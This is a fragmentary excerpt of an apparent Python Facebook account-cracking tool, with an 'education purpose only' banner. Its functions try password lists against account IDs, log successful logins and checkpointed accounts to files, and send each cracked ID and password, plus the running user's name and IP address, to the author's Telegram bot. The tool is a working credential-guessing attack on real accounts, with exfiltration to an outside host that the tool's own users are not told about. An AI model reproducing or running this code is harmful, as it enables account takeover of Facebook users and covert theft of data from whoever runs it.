...
# CODER FROM PrashantxIshan
# SAY THE NAME THE PRASHANT THE CODERR
# JAI Prash , Prash BOLKE KAM MAT SAMAJNA TERA BAP HE Prash
...
\033[1;37m-------------------------------------------
\33[1;93m  Github : PR4SH4NT B44P
\33[1;93m  Facebook : Prashant koirala
\33[1;93m  This tool is for education purpose only owner 
  will not be responsible for and
  missue The user will be responsible.
\033[1;37m-------------------------------------------""")
...
id=[]
tokenku=[]
sys.stdout.write('\x1b]2; Prash THE LORD\x07')
...
def contact():
    ...
    if admin in ['1']:
        ...
        requests.get("http://telegram.me/prashantkoiralabot&text=" + "NAME : " + username + "\nMESSAGE : " + message + "")
        linex()
...
pass
requests.get("http://telegram.me/prashantkoiralabot&text=THIS USER IS USING V5\nNAME : " + username + "\nIP ADDRESS : " + ip )
        ...
        try:
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                if cpok in ['1','01']:
                                    clear()
                                    open('/sdcard/PRASH-OK.txt', 'a')
                                    animation(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING OK IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/PRASHANT-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    clear()
                                    open('/sdcard/PRASHANT-CP.txt', 'a')
                                    print(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING CP IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/PRASHANT-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m \33[1;92m[PRASH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        PRASHANT=session.cookies.get_dict().keys()
                        if "c_user" in PRASHANT:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [PRASH-OK] %s | %s'%(ids,pas))
                                print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                open('/sdcard/PRASHANT-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                requests.get("http://telegram.me/prashantkoiralabot&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                requests.get("http://telegram.me/prashantkoiralabot&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                oks.append(ids)
                                break
                        elif 'checkpoint' in PRASHANT:
                                if 'y' in pcp:
                                        print('\r\r\x1b\033[1;33m \33[1;93m[PRASHANT-CP] '+ids+' | '+pas+'\033[1;33m')
                                        open('/sdcard/PRASHANT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [PRASHANT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [PRASHANT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                        open('/sdcard/PRASHANT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        requests.get("http://telegram.me/prashantkoiralabot&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        requests.get("http://telegram.me/prashantkoiralabot/sendMessage?chat_id=6221197589&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[\033[1;33m [PRASHANT-CP] '+ids+' | '+pas+'\033[1;33m')
                                                open('/sdcard/PRASHANT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/PRASHANT-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [PRASHANT-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                                        open('/sdcard/PRASHANT-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        requests.get("http://telegram.me/prashantkoiralabot&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                                        requests.get("http://telegram.me/prashantkoiralabot&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                                        oks.append(ids)
                                                        break
